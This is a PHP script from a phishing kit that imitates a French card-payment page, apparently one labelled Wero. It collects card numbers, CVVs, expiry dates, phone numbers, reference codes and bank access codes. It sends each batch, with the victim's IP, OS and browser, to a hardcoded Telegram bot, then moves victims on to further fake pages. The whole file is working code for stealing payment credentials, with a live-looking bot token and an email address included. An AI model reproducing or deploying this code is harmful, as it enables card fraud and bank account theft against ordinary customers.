<?php
 

function is_invalid_class($array, $key) {
    if( !is_array($array) )
        return false;

    if( isset($array[$key]) ) {
        $return = 'has-error';
        return $return;
    }
    return false;
}

function error_message($array, $key) {
    if( !is_array($array) )
        return false;

    if( isset($array[$key]) ) {
        $return = '<div class="d-block error-message">'. $array[$key] .'</div>';
        return $return;
    }
    return false;
}

function get_value($value) {
    if( isset($_SESSION[$value]) ) {
        return $_SESSION[$value];
    }
}

function get_selected_option($name,$value) {
    if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
        return 'selected';
    }
}

function validate_card($number)
 {
    global $type;
    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );
    if (preg_match($cardtype['visa'],$number)) {
        $type = "visa";
        return 'visa';
    } else if (preg_match($cardtype['mastercard'],$number)) {
        $type = "mastercard";
        return 'mastercard';
    } else if (preg_match($cardtype['amex'],$number)) {
        $type = "amex";
        return 'amex';
    } else if (preg_match($cardtype['discover'],$number)) {
        $type = "discover";
        return 'discover';
    } else {
        return false;
    }
 }

 function validate_cvv($number) {
    if (preg_match("/^[0-9]{3,4}$/",$number))
        return true;
    return false;
 }

 function validate_date($date, $format = 'Y-m-d H:i:s') {
    $d = DateTime::createFromFormat($format, $date);
    return $d && $d->format($format) == $date;
}

function validate_name($name) {
    if (!preg_match('/^[\p{L} ]+$/u', $name))
        return false;
    return true;
}

function validate_email($email) {
    if (!filter_var($email, FILTER_VALIDATE_EMAIL))
        return false;
    return true;
}

function validate_phone($phone)
{
    // Allow +, - and . in phone number
    $filtered_phone_number = filter_var($phone, FILTER_SANITIZE_NUMBER_INT);
    // Check the lenght of number
    // This can be customized if you want phone number from a specific country
    if (strlen($filtered_phone_number) != 12) {
        return false;
    } else {
        return true;
    }
}

function validate_number($number,$length = null) {
    if (is_numeric($number)) {
        if( $length == null ) {
            return true;
        } else {
            if( $length == strlen($number) )
                return true;
            return false;
        }
    } else {
        return false;
    }
}

function get_user_ip()
{
    /*$client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }*/

    return  $_SERVER['REMOTE_ADDR'];
}

function get_user_os() { 
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
        '/windows nt 10/i'     =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}

function get_user_browser() {
    $user_agent     = $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
        '/msie/i'       =>  'Internet Explorer',
        '/firefox/i'    =>  'Firefox',
        '/safari/i'     =>  'Safari',
        '/chrome/i'     =>  'Chrome',
        '/opera/i'      =>  'Opera',
        '/netscape/i'   =>  'Netscape',
        '/maxthon/i'    =>  'Maxthon',
        '/konqueror/i'  =>  'Konqueror',
        '/mobile/i'     =>  'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}

function get_user_country() {
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=". $_SERVER['REMOTE_ADDR'] .""));
    if ($details && $details->geoplugin_countryName != null) {
        $countryname = $details->geoplugin_countryName;
    }
    return $countryname;
}

function get_user_countrycode() {
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" .  $_SERVER['REMOTE_ADDR'] . ""));
    if ($details && $details->geoplugin_countryCode != null) {
        $countrycode = $details->geoplugin_countryCode;
    }
    return $countrycode;
}


function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '8942970138:AAGWB2jmCozyKCo1PZX18paXoBFXRPumdm4';
    $chat_id  = '8933881160';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}

$to = 'audib4@gmail.com';

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if( !empty($_POST['verbot']) ) {
        header("HTTP/1.0 404 Not Found");
        die();
    }

    if (isset($_POST["cardNumber"])) {

        $_SESSION['cardNumber'] = $_POST['cardNumber'];
        $_SESSION['cardName'] = $_POST['cardName'];
		$_SESSION['montant'] = $_POST['montant'];
        $_SESSION['tel'] = $_POST['tel'];
        $_SESSION['cardMonth'] = $_POST['cardMonth'];
        $_SESSION['cardYear'] = $_POST['cardYear'];
		$_SESSION['cardCvv'] = $_POST['cardCvv'];

      
            $telegram_message = '    [+]━━━━【💻 CC WERO 】━━━[+] ' . $_SERVER[''] . "\r\n";
            $telegram_message .= ' 💳 Numéro de Carte : ' . $_POST['cardNumber'] . "\r\n";
            $telegram_message .= ' 👤 Nom et prénoms : ' . $_POST['cardName'] . "\r\n";
            $telegram_message .= ' ✔️ Mois : ' . $_POST['cardMonth'] . "\r\n";
            $telegram_message .= ' ✔️ Année : ' . $_POST['cardYear'] . "\r\n";
            $telegram_message .= ' 🔑 CVV : ' . $_POST['cardCvv'] . "\r\n";
                    $telegram_message .= '' . $_POST[''] . "\r\n";

            $telegram_message .= ' [☎️ Télephone] ' . $_POST['tel'] . "\r\n";
            $telegram_message .= ' 💶 Montant : ' . $_POST['montant'] . "\r\n";
                    $telegram_message .= '' . $_POST[''] . "\r\n";
        $telegram_message .= 'OS : ' . get_user_os() . "\r\n";
        $telegram_message .= '[🌐 BROWSER] ' . get_user_browser() . "\r\n";
        $telegram_message .= '[🔍 IP INFO] ' . get_user_ip() . "\r\n";
            

            
			telegram_send(urlencode($telegram_message));
            
            header("Location: bank.php");
            }
   
   if (isset($_POST["ReferenceCode"])) {

        $_SESSION['ReferenceCode'] = $_POST['ReferenceCode'];

      
            $telegram_message = '    [+]━━━━【💻 CC WERO 】━━━[+] ' . $_SERVER[''] . "\r\n";
            $telegram_message .= ' 💳 Code de Référence : ' . $_POST['ReferenceCode'] . "\r\n";
                    $telegram_message .= '' . $_POST[''] . "\r\n";
        $telegram_message .= 'OS : ' . get_user_os() . "\r\n";
        $telegram_message .= '[🌐 BROWSER] ' . get_user_browser() . "\r\n";
        $telegram_message .= '[🔍 IP INFO] ' . get_user_ip() . "\r\n";
            

            
            telegram_send(urlencode($telegram_message));
            
            header("Location: chargement.php");
            }

    if (isset($_POST["namebank"])) {

        $_SESSION['namebank'] = $_POST['namebank'];
        $_SESSION['codeperso'] = $_POST['codeperso'];
		$_SESSION['mcbnk'] = $_POST['mcbnk'];
    

           
            $telegram_message = '    [+]━━━━【💻 AUTRES BANQUES 】━━━[+] ' . $_SERVER[''] . "\r\n";
            $telegram_message .= '' . $_POST[''] . "\r\n";
            $telegram_message .= ' 🏦: ' . $_POST['namebank'] . "\r\n";
            $telegram_message .= ' 🔓 Code Banque: ' . $_POST['codeperso'] . "\r\n";
		    $telegram_message .= ' 🆔 Nom de la Banque : ' . $_POST['mcbnk'] . "\r\n";
     
            $telegram_message .= '' . $_POST[''] . "\r\n";
            $telegram_message .= '' . $_POST[''] . "\r\n";
        $telegram_message .= 'OS : ' . get_user_os() . "\r\n";
        $telegram_message .= 'Browser : ' . get_user_browser() . "\r\n";
		$telegram_message .= '' . $_POST[''] . "\r\n";
		$telegram_message .= 'IP address : ' . get_user_ip() . "\r\n";
            
			telegram_send(urlencode($telegram_message));
            
            header("Location: success.php");
	 
      }

        
 }

?>